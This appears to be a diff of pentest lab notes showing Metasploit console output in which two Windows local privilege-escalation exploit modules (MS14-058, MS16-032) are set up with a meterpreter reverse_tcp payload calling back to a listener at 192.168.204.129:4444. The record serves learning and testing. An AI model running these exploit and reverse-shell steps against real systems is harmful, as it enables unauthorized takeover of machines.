@@ -1,4 +1,57 @@
+msf5 > use exploit/windows/local/ms14_058_track_popup_menu
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+msf5 exploit(windows/local/ms14_058_track_popup_menu) > show options
 
+Module options (exploit/windows/local/ms14_058_track_popup_menu):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SESSION                   yes       The session to run this module on.
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     192.168.204.129  yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+                                                                                                                                                                      
+   Id  Name
+   --  ----
+   0   Windows x86
+   
+   
+msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > show options
+
+Module options (exploit/windows/local/ms16_032_secondary_logon_handle_privesc):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SESSION                   yes       The session to run this module on.
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     192.168.204.129  yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows x86
+
+
+
+============================================
 
 hippoeug@kali:~$ msfconsole
 
